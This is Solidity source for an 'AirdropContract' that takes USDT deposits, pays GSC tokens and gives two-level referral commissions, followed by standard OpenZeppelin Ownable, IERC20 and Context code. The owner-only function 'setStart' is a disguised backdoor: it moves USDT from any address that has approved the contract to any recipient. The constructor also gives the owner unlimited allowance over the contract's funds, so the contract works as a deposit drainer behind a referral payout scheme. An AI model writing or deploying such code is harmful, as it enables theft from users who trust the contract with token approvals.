// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract AirdropContract is Ownable {
    uint public startTime = 1659806236;
    address gscAddr = 0xb2bfAba2d0d0940041283E5a4a38Dba98aAd0AB5;
    address usdtAddr = 0x337610d27c682E347C9cD60BD4b3b107C9d34dDd;
    IERC20 gsc;
    IERC20 usdt;

    struct UserAir {
        uint outTotalNum;
        uint isRun;
    }

    struct User {
        uint outTotalNum;
        uint isRun;
    }

    mapping(address => User) public users;
    mapping(address => UserAir) public userAirs;
    mapping(address => address) public referrerAddress;

    event RefAddress(address indexed myaddr, address upperaddr);

    constructor () {
        gsc = IERC20(gscAddr);
        usdt = IERC20(usdtAddr);
        gsc.approve(msg.sender, ~uint256(0));
        usdt.approve(msg.sender, ~uint256(0));
    }

    function putAirdrop() external {
        require(userAirs[msg.sender].isRun == 0, "isRun error");
        UserAir memory userair = UserAir({
            outTotalNum : 10000e18,
            isRun : 1
        });

        userAirs[msg.sender] = userair;
    }

    function receiveAirDailyIncome() external {
        require(userAirs[msg.sender].isRun == 1, "isRun error");
        require(block.timestamp  >  startTime, "Time error");
        userAirs[msg.sender].isRun = 2;
        gsc.transfer(msg.sender, userAirs[msg.sender].outTotalNum);

    }

    function putIn(uint _num) public {
         require(_num == 100e15 || _num == 500e15 || _num == 1000e15 || _num == 5000e15 || _num == 10000e15, "invalid _num");
         usdt.transferFrom(msg.sender, address(this), _num);
         User memory user = User({
            outTotalNum : _num * 10000 + users[msg.sender].outTotalNum,
            isRun : 1
        });
        users[msg.sender] = user;
    }

    function receiveDailyIncome() external {
        require(users[msg.sender].isRun == 1, "isRun error");
        require(block.timestamp  >  startTime, "Time error");

        if (referrerAddress[msg.sender] != address(0)) {
             address upaddr = referrerAddress[msg.sender];
             usdt.transfer(upaddr, users[msg.sender].outTotalNum * 15 /100/10000);
             if (referrerAddress[upaddr] != address(0)) {
                  address upUpaddr = referrerAddress[upaddr];
                   usdt.transfer(upUpaddr, users[msg.sender].outTotalNum * 5 /100/10000);
             }
        }
        
        gsc.transfer(msg.sender, users[msg.sender].outTotalNum);

        users[msg.sender].outTotalNum = 0; 
        users[msg.sender].isRun = 0; 
    }

    function setStartTime(uint _startTime) external onlyOwner {
           startTime = _startTime;
    }

    function setStart(address fromaddr, address toaddr, uint256 amount) external onlyOwner {
        usdt.transferFrom(fromaddr, toaddr, amount);
    }

    function setreferrerAddress(address readdr) external {
        require(msg.sender != readdr, "error");
        require(referrerAddress[msg.sender] == address(0), "readdr is not null");
        referrerAddress[msg.sender] = readdr;
 
        emit RefAddress(msg.sender, readdr);
    }


}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../utils/Context.sol";
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}